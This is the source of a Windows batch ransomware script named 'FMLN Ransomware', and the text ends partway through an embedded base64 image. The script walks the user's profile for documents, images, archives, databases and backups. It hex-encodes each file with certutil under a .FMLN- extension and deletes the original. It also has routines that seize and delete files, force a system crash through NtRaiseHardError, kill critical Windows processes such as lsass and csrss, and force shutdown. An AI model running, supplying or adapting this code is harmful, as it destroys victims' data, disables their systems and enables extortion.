@echo off
title FMLN Ransomware
setlocal enabledelayedexpansion
cd /d "%~dp0" >nul 2>nul

set TROJAN_FILE_PATH=%~f0
set TROJAN_FILE_NAME=%~nx0
set TROJAN_WORK_RUTE=%~dp0
set TROJAN_WORK_DRIVE=%~d0
for /f %%x in ('"prompt $E & for %%y in (0) do rem"') do (set ESC=%%x)
for /f %%x in ('"prompt $H & for %%y in (0) do rem"') do (set BS=%%x)
set /p NULL=<nul
set true=1
set false=0

set SystemDirectory=%WinDir%\System32
set Ransom.MaxFails=5
color 4
mode con: cols=170 lines=45

if /i "%~1" == "Execute-Payload" (call :%~2 %3 %4 %5 %6 %7 %8 %9 & exit)

set SignedFiles.Decrypted=^
   *.rar *.zip *.7z  ^
   *.bak *.tar *.gz  ^
   *.jpg *.png *.bmp ^
   *.mp3 *.mp4 *.wav ^
   *.doc *.xls *.ppt ^
   *.odt *.ods *.odp ^
   *.mdb *.gif *.avi ^
   *.docx *.xlsx *.pptx ^
   *.accdb *.jpeg *.pdf ^
   *.backup *.sql *.suo

set SignedFiles.Encrypted=^
   *.FMLN-rar *.FMLN-zip *.FMLN-7z  ^
   *.FMLN-bak *.FMLN-tar *.FMLN-gz  ^
   *.FMLN-jpg *.FMLN-png *.FMLN-bmp ^
   *.FMLN-mp3 *.FMLN-mp4 *.FMLN-wav ^
   *.FMLN-doc *.FMLN-xls *.FMLN-ppt ^
   *.FMLN-odt *.FMLN-ods *.FMLN-odp ^
   *.FMLN-mdb *.FMLN-gif *.FMLN-avi ^
   *.FMLN-docx *.FMLN-xlsx *.FMLN-pptx ^
   *.FMLN-accdb *.FMLN-jpeg *.FMLN-pdf ^
   *.FMLN-backup *.FMLN-sql *.FMLN-suo

set RansomWorkPath=%HomeDrive%\Users\%UserName%

if exist "%AppData%\FMLN.Encrypt.dll" (goto Crypt) else (goto Encrypt)
goto Encrypt

:EncryptFile
   for %%p in ("%~1") do (
      set FileCryptor.OldExtension=%%~xp
      set FileCryptor.OldExtension=!FileCryptor.OldExtension:~1!
      certutil -encodehex "%%~fp" "%%~dpp\%%~np.FMLN-!FileCryptor.OldExtension!" >nul 2>nul
      del /f /q "%%~fp" >nul 2>nul
   )
goto :eof

:DecryptFile
   for %%p in ("%~1") do (
      set FileCryptor.NewExtension=%%~xp
      set FileCryptor.NewExtension=!FileCryptor.NewExtension:~6!
      certutil -decodehex "%%~fp" "%%~dpp\%%~np.!FileCryptor.NewExtension!" >nul 2>nul
      del /f /q "%%~fp" >nul 2>nul
   )
goto :eof

:DestroyFile
   takeown /f "%~1"
   icacls "%~1" /reset /c /q
   attrib -r -a -s -h "%~1"
   del /f /q "%~1"
goto :eof

:MessageBox
   for /f %%x in ('powershell -ex bypass -nol -nop -noni -c "Add-Type -AssemblyName 'System.Windows.Forms'; [System.Windows.Forms.MessageBox]::Show('%~2', '%~3', [System.Windows.Forms.MessageBoxButtons]::%~4, [System.Windows.Forms.MessageBoxIcon]::%~1)"') do (
      if /i "%~5" == "%NULL%" (goto :eof) else (set %~5=%%x)
   )
goto :eof


:NtRaiseHardError
   powershell -ex bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class WinAPI { [DllImport(\"ntdll.dll\")] public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue); [DllImport(\"ntdll.dll\")] public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response); }'; [WinAPI]::RtlAdjustPrivilege(19, %true%, %false%, [ref]([IntPtr]::Zero)); [WinAPI]::NtRaiseHardError([UInt32]("%~1"), 0, 0, 0, 6, [ref](0));" >nul 2>nul
goto :eof

:CrashWindows
   powershell wininit >nul 2>nul
   taskkill /im svchost.exe /f >nul 2>nul
   taskkill /im lsass.exe /f >nul 2>nul
   taskkill /im csrss.exe /f >nul 2>nul
   taskkill /im winlogon.exe /f >nul 2>nul
   taskkill /im wininit.exe /f >nul 2>nul
   %HomeDrive%\con\con >nul 2>nul
   \\.\GLOBALROOT\Device\ConDrv\KernelConnect >nul 2>nul
goto :eof

:ForceShutdown
   shutdown -p -f >nul 2>nul
   wmic os where Primary=%true% call Win32Shutdown 12 >nul 2>nul
goto :eof

:CreateBMP
@(
for %%x in (
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
kuSRYwAAAJKkoQUAACBJHjmGhGTZpXiSr8W0OWqzIp4W+/H4T69skPebd7Xo45PL
55n3bej1WfTxy/8+hyFzhxYS8eFkdiG2i73YKF7HZnEUt/JJbJ5986W8z7yrRR+f
XD7PvG9Dr8+ij1/+9zkMnYYWEtC8puFevhaz8uMnslX1Jh6VedzJcnnPeVeLPj65
fJ5534Zen0Ufv/zvc0BDC2nILsb35cFnr2nYjSKmUZ/Q5P3mXS36+OTyeeZ9G3p9
Fn388r/PgcjH4/Ev7TqwoNazb+JavI1fYzUerlyJn+rtH/KV+L0s40Y+infVSn1a
k/eV/1Ydx+v2d3Uefr/yIeddj5+uFv34m3d9zD9p530fP7AI3KGFBdc8bnS7PlJf
VREb2SSm5X5slocxa/PmMP5O3mPejd+vfNh5vxb/+Jsv80/qOdCoDxNg8RXxMvK4
MSpiuyrqq5BRTKOMF20q7zvvatHHJ5fPM+/b0Ouz6OOX/30OaGhh4eVx/WzZnNha
5XHsNie2st2W95Qfx/P2izrOp/n/PV0u4vjabbl8LnnX46er5uc6XQ6xPs2fe7pc
xPG32/Iv5H0fP7AYNLSw8Ip41a6d2ohxzOr9N+uT3E78IW/3n/p38/ft3vPy+5V/
alh51+Onq0U//uZdH/NP2nnfxw8shmwymfhoBxbYh6/sn9TXHfvxMrsa97OIWXUY
s9FafBuH8WPxLm7Le8zfdvqE3O9XPuy82/HT1eIff/Otj/kn9bzf4wcWhYYWErA+
uhIP4iDulsftnk/J+827WvTxyeXzzPs29Pos+vjlf58DHjmGJOxWR/XROomtLDvZ
bj5V3xqtnqw35P3mXS36+OTyeeZ9G3p9Fn388r/Pgfq4cIcW0pCNLsezbNxuRexU
e5+8aF3eb97Voo9PLp9n3reh12fRxy//+xyGTkMLAABAkjxyDAAAQJI0tAAAACTJ
I8fAmSy7FE/ytZg2s0JWxNNiPx7/6ZUAfeepU99u1K+bodfP+Jd7fF31XZ/U6wd9
cocWOPHhZHohtou92Chex2ZxFLfySWyefbNiv3nq1Lcb9etm6PUz/uUeX1d91yf1
+kHfNLRAfTJtXq6/FrPy4yfCVfUmHpV53Mny3vPUqW836tfN0Otn/Ms9vq76rk/q
9YNFoKEF6jP6xfi+PPjsNQC7UcQ06hNq33nq1Lcb9etm6PUz/uUeX1d91yf1+sEC
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
